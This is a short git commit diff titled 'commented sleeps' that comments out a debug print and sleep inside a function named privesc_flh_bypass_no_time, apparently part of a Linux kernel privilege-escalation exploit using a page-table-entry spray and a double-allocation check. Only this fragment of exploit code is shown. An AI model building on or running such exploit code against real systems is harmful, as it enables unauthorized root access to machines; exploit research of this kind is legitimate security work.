59e556a040ac231424939b1d0c6c687bea6b9db6
Willenst <willenst@gmail.com>
2024-11-11 23:16:10 +0200

    commented sleeps

--- src/main.c
+++ src/main.c
@@ -360,8 +360,8 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
-		printf("sleep 1, i = %d \n", i);
-		sleep(0.1);
+		//printf("sleep 1, i = %d \n", i);
+		//sleep(0.1);
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
